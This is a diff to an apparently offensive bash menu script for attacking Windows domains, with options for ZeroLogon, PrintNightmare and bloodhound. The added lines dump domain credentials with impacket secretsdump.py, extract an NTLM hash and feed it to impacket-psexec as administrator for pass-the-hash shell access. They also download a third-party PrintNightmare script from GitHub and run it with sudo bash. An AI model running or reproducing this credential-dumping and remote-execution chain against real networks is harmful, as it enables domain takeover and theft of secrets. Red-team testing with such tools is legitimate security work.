@@ -64,7 +64,7 @@ else
 		which rustscan
 		if [ $? -ne 0 ]; then
 			echo "Downloading rustscan v2.0.1 and doing and update"
-			https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
+			wget https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
 			sudo dpkg -i rustscan_2.0.1_amd64.deb
 			sudo apt update
 		else 
@@ -87,8 +87,9 @@ echo "
 4)  ZeroLogon 
 5)  PrintNightmare (Need to run Rustscan or NMAP first)
 6)  Run bloodhound-python (needs to be installed, if not installed run Download Tools first)
-7)  Listen to some NIN 
-8)  Run the whole script (Will do the above and much more)
+7)  Listen to some NIN
+8)  SecretsDump (Need Username and Password)
+z)  Run the whole script (Will do the above and much more)
 99) exit
 "
 
@@ -230,8 +231,7 @@ elif [ $answer = 5 ]; then
 		read -p "System may be vulnerable to Print Nightmare, exploit? (y/n)" answer
 		read -p "Would you like to download a PrintNightmare Script made by OvergrownCarrot1? (NOTE: THIS HAS ONLY WORKED ON A FEW MACHINES) (y/n)" answer
 		if [ $answer = y ] ; then
-			git clone https://github.com/overgrowncarrot1/PrintNightmareScript.sh.git
-			cd PrintNightmareScript
+			wget https://raw.githubusercontent.com/overgrowncarrot1/Invoke-Everything/main/PrintNightmareScript.sh			
 			sudo bash PrintNightmareScript.sh
 			cd ..
 	elif [ $answer = n ] ; then
@@ -265,8 +265,13 @@ read -p "Lets start off with the important questions NIN? (Not streamer friendly
 	else 
 		echo "I am not going to type out every song, come on man"
 	fi
-elif [ $answer = 8 ]; then
-	echo -e '\E[31;35m' "Doing an update first to make sure we can find all files"
+elif [ $answer = 8 ] && [ $USER ] && [ $PASS ] && [ $DOMAIN ] ; then
+	echo -e '\E[31;35m' "Saving everything to secretsdump.txt"; tput sgr0
+	secretsdump.py "$DOMAIN/$USER:$PASS"@$DOMAINIP > secretsdump.txt
+	hash=$(cat secretsdump.txt | sed '6q;d' | cut -d ':' -f 3,4)
+	impacket-psexec -hashes $hash administrator@$DOMAINIP 
+elif [ $answer = z ]; then
+	echo -e '\E[31;35m' "Doing an update first to make sure we can find all files"; tput sgr0
 	sudo apt update
 	
 	which enum4linux
